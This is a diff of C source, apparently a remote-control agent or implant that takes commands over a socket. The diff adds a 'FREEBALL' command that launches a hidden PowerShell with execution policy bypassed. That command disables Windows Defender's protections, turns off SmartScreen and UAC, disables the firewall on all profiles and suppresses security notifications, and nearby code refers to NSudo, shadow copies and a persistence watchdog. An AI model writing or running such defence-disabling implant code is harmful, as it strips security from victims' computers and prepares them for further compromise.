@@ -210,6 +210,27 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             "} else { Write-Host 'NSudo.exe not found after extraction'; }\"";
         result = sys_run_command(ps);
     }
+    else if (strcmp(cmd, "FREEBALL") == 0) {
+        const char *ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""
+            "Set-MpPreference -DisableRealtimeMonitoring $true; "
+            "Set-MpPreference -DisableBehaviorMonitoring $true; "
+            "Set-MpPreference -DisableIOAVProtection $true; "
+            "Set-MpPreference -DisableBlockAtFirstSeen $true; "
+            "Set-MpPreference -DisablePrivacyMode $true; "
+            "Set-MpPreference -DisableScanOnRealtimeEnable $true; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableOnAccessProtection /t REG_DWORD /d 1 /f; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' /v EnableSmartScreen /t REG_DWORD /d 0 /f; "
+            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' /v SmartScreenEnabled /t REG_SZ /d Off /f; "
+            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v EnableLUA /t REG_DWORD /d 0 /f; "
+            "netsh advfirewall set allprofiles state off; "
+            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration' /v Notification_Suppress /t REG_DWORD /d 1 /f; "
+            "Write-Host 'All done. Restart your computer now.' -ForegroundColor Green\"";
+        result = sys_run_command(ps);
+    }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
         /* Start watchdog only once, when user explicitly deploys */
